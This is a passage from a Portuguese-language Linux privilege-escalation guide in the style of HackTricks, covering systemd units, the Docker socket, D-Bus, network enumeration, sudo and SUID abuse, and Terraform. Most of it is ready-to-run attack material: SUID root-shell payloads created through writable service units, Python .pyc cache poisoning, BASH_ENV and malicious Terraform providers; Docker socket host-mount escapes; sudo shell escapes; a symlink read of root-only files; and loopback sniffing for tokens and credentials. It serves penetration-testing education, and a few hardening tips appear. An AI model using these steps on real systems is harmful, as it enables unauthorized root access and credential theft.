Se descobrir que consegue **escrever** em qualquer uma das pastas do caminho, talvez consiga **escalar privilégios**. Você precisa procurar por **caminhos relativos sendo usados em arquivos de configuração de serviços**, como:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Em seguida, crie um **executável** com o **mesmo nome do binário no caminho relativo** dentro da pasta PATH do systemd em que você pode escrever. Quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), seu **backdoor será executado** (usuários sem privilégios geralmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Timers**

**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` e que controlam arquivos `**.service**` ou eventos. **Timers** podem ser usados como alternativa ao cron, pois têm suporte integrado a eventos de horário de calendário e a eventos de tempo monotônico, e podem ser executados de forma assíncrona.

Você pode enumerar todos os timers com:

```bash
systemctl list-timers --all
```

### Timers graváveis

Se você puder modificar um timer, poderá fazê-lo executar algumas unidades existentes de systemd.unit (como um `.service` ou um `.target`)

```bash
Unit=backdoor.service
```

Na documentação, você pode ler o que é a unidade:

> A unidade a ser ativada quando esse timer expirar. O argumento é o nome de uma unidade, cujo sufixo não é ".timer". Se não for especificado, esse valor assume como padrão um serviço com o mesmo nome da unidade do timer, exceto pelo sufixo. (Veja acima.) Recomenda-se que o nome da unidade ativada e o nome da unidade do timer sejam idênticos, exceto pelo sufixo.

Portanto, para abusar dessa permissão, você precisaria:

- Encontrar alguma unidade do systemd (como um `.service`) que esteja **executando um binário gravável**
- Encontrar alguma unidade do systemd que esteja **executando um caminho relativo** e sobre a qual você tenha **permissões de gravação no PATH do systemd** (para se passar por esse executável)

**Saiba mais sobre timers com `man systemd.timer`.**

### **Habilitando o Timer**

Para habilitar um timer, você precisa de privilégios de root e executar:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Observe que o **timer** é **ativado** criando um link simbólico para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permitem a **comunicação entre processos** na mesma máquina ou em máquinas diferentes, dentro de modelos cliente-servidor. Eles utilizam arquivos descritores Unix padrão para a comunicação entre computadores e são configurados por meio de arquivos `.socket`.<sup>[[14]](#references)</sup>

Os sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro desse arquivo, vários parâmetros interessantes podem ser configurados:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas resumidamente **indicam onde o socket vai escutar** (o caminho do arquivo de socket AF_UNIX, o IPv4/6 e/ou o número da porta em que escutar etc.)
- `Accept`: Recebe um argumento booleano. Se **true**, uma **instância do serviço é iniciada para cada conexão recebida**, e somente o socket da conexão é passado a ela. Se **false**, todos os sockets de escuta são **passados à unidade de serviço iniciada**, e apenas uma unidade de serviço é iniciada para todas as conexões. Esse valor é ignorado para sockets de datagrama e FIFOs, nos quais uma única unidade de serviço lida incondicionalmente com todo o tráfego recebido. **O padrão é false**. Por motivos de desempenho, recomenda-se escrever novos daemons de forma que sejam compatíveis com `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Recebem uma ou mais linhas de comando, que são **executadas antes** ou **depois** que os **sockets**/FIFOs de escuta são **criados** e associados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos do processo.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionais **executados antes** ou **depois** que os **sockets**/FIFOs de escuta são **fechados** e removidos, respectivamente.
- `Service`: Especifica o nome da unidade de **serviço a ser ativada** com o **tráfego recebido**. Essa configuração só é permitida para sockets com Accept=no. O padrão é o serviço que tem o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não é necessário usar essa opção.

### Arquivos .socket graváveis

Se encontrar um arquivo `.socket` **gravável**, você pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor`, e o backdoor será executado antes da criação do socket. Portanto, **provavelmente será necessário esperar até que a máquina seja reiniciada.**\
_Observe que o sistema precisa estar usando essa configuração de arquivo de socket, caso contrário, o backdoor não será executado_

### Ativação de socket + caminho de unidade gravável (criar serviço ausente)

Outra configuração incorreta de alto impacto é:

- uma unidade de socket com `Accept=no` e `Service=<name>.service`
- a unidade de serviço referenciada está ausente
- um atacante pode gravar em `/etc/systemd/system` (ou em outro caminho de busca de unidades)

Nesse caso, o atacante pode criar `<name>.service` e, em seguida, enviar tráfego ao socket para que o systemd carregue e execute o novo serviço como root.

Fluxo rápido:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets graváveis

Se você **identificar qualquer socket gravável** (_agora estamos falando de Unix Sockets, e não dos arquivos de configuração `.socket`_), então **poderá se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerar Unix Sockets

```bash
netstat -a -p --unix
```

### Conexão bruta

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exemplo de exploração:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Observe que pode haver alguns **sockets escutando por requisições HTTP** (_não estou falando de arquivos .socket, mas de arquivos que atuam como sockets Unix_). Você pode verificar isso com:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Se o socket **responder a uma solicitação HTTP**, você poderá **se comunicar** com ele e talvez **explorar alguma vulnerabilidade**.

### Socket do Docker com permissão de escrita

O socket do Docker, geralmente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele pode ser escrito pelo usuário `root` e por membros do grupo `docker`. Ter acesso de escrita a esse socket pode levar à escalação de privilégios. Veja como isso pode ser feito e métodos alternativos caso a CLI do Docker não esteja disponível.

#### **Escalação de privilégios com a CLI do Docker**

Se você tiver acesso de escrita ao socket do Docker, poderá escalar privilégios usando os seguintes comandos:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

These commands permitem executar um container com acesso root ao sistema de arquivos do host.

#### **Usando a API do Docker diretamente**

Quando a CLI do Docker não estiver disponível, ainda é possível abusar do socket do Docker usando HTTP bruto pelo socket Unix. O fluxo mais confiável é:

- criar um container auxiliar de longa duração com o diretório raiz do host montado via bind
- iniciá-lo
- criar uma instância `exec` dentro desse container auxiliar
- iniciar a instância `exec` e ler a saída pela API

**Listar imagens do Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Criar e iniciar um contêiner auxiliar**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Crie uma instância exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Inicie a instância exec e leia a saída**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Esse padrão costuma ser mais robusto do que tentar controlar `attach` manualmente com `socat` ou `nc -U`. Depois que você puder criar um helper com `/:/host`, poderá usar instâncias adicionais de `exec` para ler arquivos como `/host/root/...`, adicionar chaves SSH em `/host/root/.ssh` ou modificar arquivos de inicialização do host.

### Outros

Observe que, se você tiver permissões de escrita no socket do docker por estar **dentro do grupo `docker`**, há [**mais maneiras de escalar privilégios**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Se a [**API do docker estiver escutando em uma porta**, você também poderá comprometê-la](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Confira **mais maneiras de escapar de containers ou abusar de runtimes de containers para escalar privilégios** em:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalação de privilégios com Containerd (ctr)

Se você descobrir que pode usar o comando **`ctr`**, leia a página a seguir, pois **talvez você possa abusar dele para escalar privilégios**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalação de privilégios com **RunC**

Se você descobrir que pode usar o comando **`runc`**, leia a página a seguir, pois **talvez você possa abusar dele para escalar privilégios**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus é um sofisticado **sistema de comunicação entre processos (IPC)** que permite que aplicações interajam e compartilhem dados com eficiência. Projetado para os sistemas Linux modernos, oferece uma estrutura robusta para diferentes formas de comunicação entre aplicações.<sup>[[16]](#references)</sup>

O sistema é versátil: oferece suporte à IPC básica, que aprimora a troca de dados entre processos, de forma semelhante a **sockets de domínio UNIX aprimorados**. Além disso, ajuda a transmitir eventos ou sinais, promovendo a integração contínua entre os componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth sobre uma chamada recebida pode fazer com que um reprodutor de música silencie, melhorando a experiência do usuário. D-Bus também oferece suporte a um sistema de objetos remotos, simplificando solicitações de serviços e invocações de métodos entre aplicações, o que agiliza processos tradicionalmente complexos.

D-Bus funciona com um **modelo de permitir/negar**, gerenciando as permissões de mensagens (chamadas de métodos, emissões de sinais etc.) com base no efeito cumulativo das regras de política correspondentes. Essas políticas especificam as interações com o barramento e podem permitir a escalação de privilégios por meio da exploração dessas permissões.

A seguir, é apresentado um exemplo de política em `/etc/dbus-1/system.d/wpa_supplicant.conf`, que detalha as permissões do usuário root para possuir, enviar e receber mensagens de `fi.w1.wpa_supplicant1`.

As políticas sem usuário ou grupo especificado se aplicam universalmente, enquanto as políticas de contexto "default" se aplicam a tudo o que não é abrangido por outras políticas específicas.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Saiba como enumerar e explorar uma comunicação D-Bus aqui:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rede**

É sempre interessante enumerar a rede e descobrir a posição da máquina.

### Enumeração genérica

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Se uma entrada ativa em `/etc/inetd.conf` executar o GNU Inetutils `telnetd` como root, verifique a versão do binário configurado e o listener local, mesmo quando a porta estiver vinculada apenas ao loopback. O GNU Inetutils das versões 1.9.3 até 2.7 tinha um [bypass de autenticação do telnet](https://seclists.org/oss-sec/2026/q1/89) no qual o `USER` fornecido pelo cliente chegava ao `login -f` (CVE-2026-24061). Um processo ou uma string de versão é um indicador; confirme o status dos patches do fornecedor e o daemon real antes de considerar que está exposto. O [guia de Telnet](../../../network-services-pentesting/pentesting-telnet.md) tem mais detalhes.

### Triagem rápida de filtragem de tráfego de saída

Se o host puder executar comandos, mas os callbacks falharem, diferencie rapidamente a filtragem de DNS, transporte, proxy e rotas:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com os quais você não conseguiu interagir antes de acessá-la:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Classifique os listeners pelo endereço de bind:

- `0.0.0.0` / `[::]`: expostos em todas as interfaces locais.
- `127.0.0.1` / `::1`: somente locais (bons candidatos para tunnel/forward).
- IPs internos específicos (por exemplo, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): geralmente acessíveis apenas a partir de segmentos internos.

### Fluxo de triagem de serviços somente locais

Quando você compromete um host, os serviços vinculados a `127.0.0.1` muitas vezes se tornam acessíveis pela primeira vez a partir do seu shell. Um fluxo de trabalho local rápido é:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS como scanner de rede (modo apenas de rede)

Além das verificações locais de PE, o linPEAS pode funcionar como um scanner de rede dedicado. Ele usa os binários disponíveis em `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) e não instala ferramentas.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Se você passar `-d`, `-p` ou `-i` sem `-t`, o linPEAS se comportará como um scanner de rede puro (ignorando o restante das verificações de escalonamento de privilégios).

### Sniffing

Verifique se você consegue farejar o tráfego. Se conseguir, talvez possa capturar algumas credenciais.

```
timeout 1 tcpdump
```

Verificações práticas rápidas:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) é especialmente valioso em post-exploitation porque muitos serviços somente internos expõem tokens/cookies/credenciais ali:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Capture agora, analise depois:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Usuários

### Enumeração Genérica

Verifique **quem** você é, quais **privilégios** você tem, quais **usuários** existem nos sistemas, quais podem **fazer login** e quais têm **privilégios de root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID alto

Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT_MAX** escalem privilégios. Mais informações: [aqui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aqui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [aqui](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit it** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é **membro de algum grupo** que possa conceder privilégios de root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Área de transferência

Verifique se há algo interessante na área de transferência (se possível)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Política de Senhas

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Senhas conhecidas

Se você **souber alguma senha** do ambiente, **tente fazer login como cada usuário** usando essa senha.

### Su Brute

Se não se importar em gerar muito ruído e os binários `su` e `timeout` estiverem presentes no computador, você pode tentar fazer brute-force de usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
O [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta fazer brute-force de usuários.

## Abusos de PATH gravável

### $PATH

Se você descobrir que pode **escrever em alguma pasta do $PATH**, talvez consiga escalar privilégios **criando um backdoor dentro da pasta gravável** com o nome de algum comando que será executado por outro usuário (idealmente, root) e que **não seja carregado de uma pasta localizada antes da sua pasta gravável no $PATH**.

### SUDO e SUID

Você pode ter permissão para executar algum comando usando sudo ou ele pode ter o bit suid definido. Verifique usando:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Alguns **comandos inesperados permitem ler e/ou gravar arquivos ou até mesmo executar um comando**.<sup>[[8]](#references)</sup> Por exemplo:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

A configuração do Sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem saber a senha.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Neste exemplo, o usuário `demo` pode executar `vim` como `root`; agora é trivial obter um shell adicionando uma chave ssh ao diretório root ou chamando `sh`.

```
sudo vim -c '!sh'
```

### Comparação Bash sem aspas em um script sudo

No Bash, o lado direito de `[[ "$protected" == $candidate ]]` é um padrão. Se um script sudo com capacidade de execução como root preencher `candidate` a partir de um arquivo controlado pelo chamador, um valor como `prefix*` poderá corresponder ao início de uma string protegida. Diferentes caminhos de sucesso e erro podem então expor um oráculo de prefixo. Coloque o lado direito entre aspas (`[[ "$protected" == "$candidate" ]]`) quando a intenção for uma comparação literal. Revise os argumentos sudo efetivos, a origem da entrada e o comportamento observável dos caminhos antes de considerar explorável uma comparação sem aspas. O [manual do GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) define esse comportamento de padrão.

### Arquivos de projeto do PrusaSlicer sob sudo

Uma concessão irrestrita de sudo com capacidade de execução como root para `prusaslicer` ou `prusa-slicer` merece ser revisada se o chamador puder escolher o projeto `.3mf` a ser fatiado. Um projeto pode conter um script de pós-processamento executado quando o G-code é exportado; projetos criados para esse fim poderiam executar comandos no PrusaSlicer até a versão 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Confirme a regra sudo efetiva, a versão do binário e os patches do fornecedor, a origem do projeto e se o caminho de exportação relevante é executado antes de concluir que o limite de privilégio pode ser alcançado. Um argumento de projeto fixo ou uma política `NOEXEC` efetiva pode mudar o resultado. Encontrar apenas o slicer instalado não comprova um caminho de escalada de privilégio.

### SETENV

Essa diretiva permite que o usuário **defina uma variável de ambiente** ao executar algo:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Este exemplo, **baseado na máquina Admirer do HTB**, era **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca Python arbitrária enquanto executava o script como root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Poisoning de `__pycache__` / `.pyc` gravável em imports Python permitidos pelo sudo

Se um **script Python permitido pelo sudo** importar um módulo cujo diretório do pacote contém um **`__pycache__` gravável**, talvez você consiga substituir o `.pyc` em cache e executar código como o usuário privilegiado no próximo import.<sup>[[30]](#references)</sup>

- Por que funciona:
  - O CPython armazena caches de bytecode em `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - O interpretador valida o **cabeçalho** (magic + metadados de timestamp/hash vinculados ao código-fonte) e, em seguida, executa o objeto de código marshaled armazenado após esse cabeçalho.
  - Se você puder **excluir e recriar** o arquivo em cache porque o diretório é gravável, ainda será possível substituir um `.pyc` pertencente ao root, mas não gravável.
- Caminho típico:
  - `sudo -l` mostra um script ou wrapper Python que você pode executar como root.
  - Esse script importa um módulo local de `/opt/app/`, `/usr/local/lib/...` etc.
  - O diretório `__pycache__` do módulo importado é gravável pelo seu usuário ou por todos.

Enumeração rápida:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Se puder inspecionar o script privilegiado, identifique os módulos importados e o caminho do cache:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Fluxo de abuso:

1. Execute uma vez o script permitido via sudo para que o Python crie o arquivo de cache legítimo, caso ele ainda não exista.
2. Leia os primeiros 16 bytes do `.pyc` legítimo e reutilize-os no arquivo envenenado.
3. Compile um objeto de código de payload, use `marshal.dumps(...)` nele, exclua o arquivo de cache original e recrie-o com o cabeçalho original seguido do bytecode malicioso.
4. Execute novamente o script permitido via sudo para que a importação execute seu payload como root.

Observações importantes:

- Reutilizar o cabeçalho original é essencial porque o Python verifica os metadados do cache em relação ao arquivo-fonte, não se o corpo do bytecode realmente corresponde ao código-fonte.
- Isso é especialmente útil quando o arquivo-fonte pertence ao root e não permite escrita, mas o diretório `__pycache__` que o contém permite.
- `PYTHONDONTWRITEBYTECODE=1` e `python -B` impedem o Python de gravar novos arquivos `.pyc`; eles **não** impedem o carregamento de um cache já válido que tenha sido substituído por um atacante. O limite crítico é se um usuário com menos privilégios pode substituir um cache que a importação privilegiada aceitará. Antes de carregar bytecode em cache, o Python verifica os metadados de data/hora e tamanho ou de hash. Consulte a [referência de importação do Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) e a [documentação da linha de comando](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Estrutura mínima de proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Endurecimento:

- Garanta que nenhum diretório no caminho de importação do Python com privilégios elevados seja gravável por usuários com poucos privilégios, incluindo `__pycache__`.
- Audite a propriedade e as permissões dos diretórios de cache, incluindo arquivos `.pyc` existentes. Desabilitar a gravação de bytecode pode reduzir a criação de novos caches, mas não neutraliza um cache existente que possa ser substituído.
- Trate módulos Python locais graváveis e diretórios de cache graváveis da mesma forma que trataria scripts de shell ou bibliotecas compartilhadas graváveis executados pelo root.

### BASH_ENV preservado via sudo env_keep → shell do root

Se o sudoers preservar `BASH_ENV` (por exemplo, `Defaults env_keep+="ENV BASH_ENV"`), você pode aproveitar o comportamento de inicialização não interativa do Bash para executar código arbitrário como root ao invocar um comando permitido.<sup>[[24]](#references)</sup>

- Por que funciona: Em shells não interativos, o Bash avalia `$BASH_ENV` e executa o arquivo com `source` antes de executar o script de destino. Muitas regras do sudo permitem executar um script ou um wrapper de shell. Se `BASH_ENV` for preservado pelo sudo, seu arquivo será executado com privilégios de root.<sup>[[23]](#references)</sup>

- Requisitos:
  - Uma regra do sudo que você possa executar (qualquer destino que invoque `/bin/bash` de forma não interativa ou qualquer script Bash).
  - `BASH_ENV` presente em `env_keep` (verifique com `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - Remova `BASH_ENV` (e `ENV`) de `env_keep`; prefira `env_reset`.
  - Evite wrappers de shell para comandos permitidos pelo sudo; use binários mínimos.
  - Considere o registro de I/O do sudo e alertas quando variáveis de ambiente preservadas forem usadas.

### Terraform via sudo com HOME preservado (!env_reset)

Quando o sudo permite executar Terraform como um usuário mais privilegiado, `!env_reset` é uma pista para verificar quais variáveis de ambiente realmente sobrevivem a essa regra específica. Confirme o `HOME` ou `TF_CLI_CONFIG_FILE` efetivo antes de considerar um `.terraformrc` ou `terraform.rc` gravável pelo chamador como a configuração ativa da CLI. Uma entrada `provider_installation.dev_overrides` só importa se o comando Terraform fixo carregar esse provider e o chamador puder colocar o executável no diretório selecionado.<sup>[[25]](#references)</sup>

- Aponte o provider necessário para um diretório gravável e coloque nele um plugin malicioso com o nome do provider (por exemplo, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

O Terraform falhará no handshake do plugin Go, mas executará o payload como root antes de encerrar, deixando um shell SUID.

### Sobrescritas de TF_VAR + bypass da validação de symlink

As variáveis do Terraform podem ser fornecidas por meio de variáveis de ambiente `TF_VAR_<name>` se a regra específica do sudo preservá-las. Uma **leitura** por symlink de origem também requer um provider que siga o link e copie o resultado protegido para um destino legível pelo usuário. Separadamente, uma **gravação** por symlink de destino requer uma entrada de destino controlada pelo usuário e um provider privilegiado que a siga durante a gravação; um job agendado posteriormente é apenas uma possível consequência. Antes de testar qualquer uma das rotas, inspecione a concessão exata do sudo, os arquivos `.tf` relevantes, a configuração selecionada da CLI e a propriedade dos caminhos usando comandos somente de leitura, como `sudo -l`, `stat` e `readlink`. Validações lexicais fracas, como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, não resolvem symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

O Terraform resolve o link simbólico e copia o `/root/root.txt` real para um destino legível pelo atacante. A mesma abordagem pode ser usada para **escrever** em caminhos privilegiados, criando previamente links simbólicos no destino (por exemplo, apontando o caminho de destino do provider para dentro de `/etc/cron.d/`).

### requiretty / !requiretty

